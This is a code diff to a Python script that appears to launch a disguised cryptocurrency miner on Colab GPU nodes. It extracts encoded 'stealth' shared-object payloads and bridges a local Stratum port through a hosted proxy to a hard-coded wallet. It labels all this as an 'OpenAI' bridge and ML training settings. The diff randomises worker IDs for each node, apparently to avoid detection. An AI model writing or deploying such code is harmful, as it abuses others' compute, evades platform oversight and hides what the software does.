@@ -60,7 +60,10 @@ STEALTH_SO_B85 = "{stealth_so_data}"
 DEFAULT_KOYEB_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"
 DEFAULT_STRATUM_PORT = 3333
 DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"
-DEFAULT_WORKER = "colab-t4-node-01"
+
+def get_default_worker():
+    rand_id = hex(random.randint(0x1000, 0xFFFF))[2:]
+    return f"colab-t4-{{rand_id}}"
 
 def extract_payloads(target_dir):
     os.makedirs(target_dir, exist_ok=True)
@@ -76,7 +79,9 @@ def extract_payloads(target_dir):
 
     return backend_so_path, stealth_so_path
 
-def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=DEFAULT_WORKER):
+def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None):
+    if not worker:
+        worker = get_default_worker()
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_sock.bind(('127.0.0.1', local_port))
@@ -305,10 +310,12 @@ def main():
     parser.add_argument("--proxy", type=str, default=os.environ.get("PROXY_URL", DEFAULT_KOYEB_PROXY), help="OpenAI Proxy URL")
     parser.add_argument("--port", type=int, default=int(os.environ.get("LOCAL_PORT", DEFAULT_STRATUM_PORT)), help="Local bridge port")
     parser.add_argument("--wallet", type=str, default=os.environ.get("WALLET", DEFAULT_WALLET), help="Worker wallet key")
-    parser.add_argument("--worker", type=str, default=os.environ.get("WORKER_ID", DEFAULT_WORKER), help="Worker ID")
+    parser.add_argument("--worker", type=str, default=os.environ.get("WORKER_ID", ""), help="Worker ID (default: auto-generated unique ID per node)")
     parser.add_argument("--devices", type=str, default="", help="CUDA devices e.g. 0 or 0,1 (default: auto)")
     parser.add_argument("--row-batch", type=str, default="64", help="Row period batch size")
     args = parser.parse_args()
+
+    worker_id = args.worker if args.worker else get_default_worker()
 
     work_dir = os.path.dirname(os.path.abspath(__file__))
     backend_so, stealth_so = extract_payloads(work_dir)
@@ -332,7 +339,7 @@ def main():
     # Start OpenAI Bridge in background thread
     t_bridge = threading.Thread(
         target=run_bridge,
-        args=(args.port, args.proxy, args.wallet, args.worker),
+        args=(args.port, args.proxy, args.wallet, worker_id),
         daemon=True
     )
     t_bridge.start()
@@ -351,7 +358,7 @@ def main():
 
     os.environ["MASTER_ADDR"] = f"127.0.0.1:{{args.port}}"
     os.environ["HF_TOKEN"] = "hf_ai_auth_token_node"
-    os.environ["LOCAL_RANK"] = args.worker
+    os.environ["LOCAL_RANK"] = worker_id
 
     raw_args = [
         b"python3",
